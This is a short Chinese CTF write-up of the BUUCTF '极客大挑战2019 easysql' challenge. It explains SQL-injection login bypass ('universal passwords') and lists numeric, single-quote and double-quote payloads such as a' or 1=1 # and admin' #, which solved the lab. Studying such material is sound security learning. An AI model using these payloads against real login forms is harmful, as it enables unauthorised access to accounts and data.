# BUUCTF Web ---[极客大挑战2019]easysql 

> 涉及知识点---sql 万能密码

打开题目 一看帅气的页面 然后让输入用户名和密码 
![image](https://github.com/uicciu/image/blob/main/easysql1.png)
随便输一个吧
![image](https://github.com/uicciu/image/blob/main/easysql2.png)
显示用户名或密码有误 考虑看一下源代码 啥也没看到 再用burpsuit抓一下包看看 也啥也没看到 考虑sql注入

听说有个东西叫万能密码
这里有一部分
* 万能账号
> 原理

当我们在登录界面输入 【万能账号】比如 a’ or true # 以后，后端会将我们输入的参数拼接到SQL中，然后去数据库中查询账号和密码，SQL语句大概是下面这样

select * from user where username='a' or true #' and password='pass'

由于 # 在SQL中是注释符，注释符后面的内容不起作用，所以真正执行的SQL语句大概是下面这样

select * from user where username='a' or true

or true 会使SQL语句恒成立，从而查询出数据库中的所有账号和密码，从而使我们成功登录


【数值型万能账号】

    a or true #

    a or 1 #

    a or 1=1 #

    a or true -- a

    a or 1 -- a

    a or 1=1 -- a



【单引号字符型万能密码】

    a' or true #

    a' or 1 #

    a' or 1=1 #

    a' or true --a

    a' or 1 -- a

    a' or 1=1 -- a

【双引号字符型万能密码】

    a" or true #

    a" or 1 #

    a" or 1=1 #

    a" or true -- a

    a" or 1 -- a

    a" or 1=1 -- a
    
* 万能密码
> 原理

当我们在登录界面输入 【万能密码】 比如 admin’ # 以后，后端会将我们输入的参数拼接到SQL中，大概是下面这样

select * from user where username='admin' #' and password='pass'

由于 # 在SQL中是注释符，注释符后面的内容不起作用，所以真正执行的SQL大概是下面这样

select * from user where username='admin'

SQL只会在数据库中查询用户名，而不是同时查询用户名和密码，这就意味着，只要用户名正确，就可以登录成功    

【数值型万能密码】

    admin #

    admin -- a



【单引号字符串型万能密码】

    admin' #

    admin' -- a



【双引号字符串型万能密码】

    admin” #

    admin" -- a
    

拿万能密码试一试

![image](https://github.com/uicciu/image/blob/main/easysql4.png)

ah 找到了

嘶 但是还是不知道他是指的什么 但是知道了一种方法



